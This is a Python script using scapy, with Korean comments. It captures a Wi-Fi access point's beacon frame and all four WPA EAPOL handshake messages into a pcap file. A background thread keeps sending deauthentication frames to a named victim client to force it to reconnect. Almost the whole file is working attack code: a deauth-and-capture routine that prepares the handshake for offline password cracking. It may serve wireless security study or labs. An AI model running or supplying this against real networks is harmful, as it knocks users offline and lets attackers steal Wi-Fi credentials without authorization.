import threading
import time
from scapy.all import sniff, wrpcap
from scapy.layers.dot11 import Dot11
from scapy.layers.eap import EAPOL
from def_atkDeauth import atkDeauth


keyInfoList = [b'\x00\x8a', b'\x01\x0a', b'\x13\xca', b'\x03\x0a']
collCheck = [False, False, False, False]
pktList = []
bssid = ''

def beaconCapture(pkt):
    if pkt.haslayer(Dot11):
        dot11Frm = pkt.getlayer(Dot11)
        if (dot11Frm.type == 0) and (dot11Frm.subtype == 8):
            if str(dot11Frm.addr3).upper() == bssid:
                pktList.append(pkt)
                print('Beacon Frame Found. ('+str(pkt.info)+', BSS='+bssid+')')
# BEACON 프레임 수집

def beaconStop(pkt):
    if len(pktList) > 0:
        return True
    else:
        return False
# BEACON 프레임 수집 종료
    
def eapolCapture(pkt):
    if pkt.haslayer(Dot11):
        dot11Frm = pkt.getlayer(Dot11)
        if str(dot11Frm.addr3).upper() == bssid:
        # 해당하는 BSSID의 EAPOL 프레임만 수집
            if pkt.haslayer(EAPOL):
                eapolFrm =  pkt.getlayer(EAPOL)
                keyInfo = eapolFrm[0].load[1:3]
                for idx, val in enumerate(keyInfoList):
                # EAPOL Frame의 Key Information을 비교해 리스트에 저장
                    if keyInfo == val:
                        collCheck[idx] = True
                        idx += 1
                        print('EAPOL Message '+str(idx)+' Found. ('+str(val)+', BSS='+bssid+')')
                        pktList.append(pkt)
                        break
# EAPOL 프레임 수집

def eapolStop(pkt):
    if False not in collCheck :
    # EAPOL 1~4 모두 수집이 되면 수집 종료
        wrpcap('./test.pcap', pktList)
        return True
    else:
        return False
# EAPOL 프레임 수집 종료


def deauthThread(vicAddr:str, bssAddr:str):
    print('Deauth thread enable.')
    while(True):
        atkDeauth(vicAddr, bssAddr, loopMax=3)
        # 재연결 유도를 위해 Deauth를 3회 전송
        time.sleep(5)
        # 5초 대기
        if False not in collCheck :
        # EAPOL 1~4 모두 수집이 되면 수집 종료
            print('Deauth thread disable.')
            return True
# Deauth 프레임 전송

def collEapol(bssAddr:str, vicAddr='', deauthFlag=False):
    global bssid
    bssid = bssAddr
    
    if vicAddr != '':
        thread = threading.Thread(target=deauthThread, args=(vicAddr, bssAddr))
        thread.start()
        # Deauth Thread 생성
    
    sniff(prn=beaconCapture, stop_filter=beaconStop)
    # BEACON 핸들러 실행
    sniff(prn=eapolCapture, filter='ether proto 0x888e', stop_filter=eapolStop)
    # EAPOL 핸들러 실행

    if vicAddr != '':
        thread.join()
        # Deauth Thread 대기
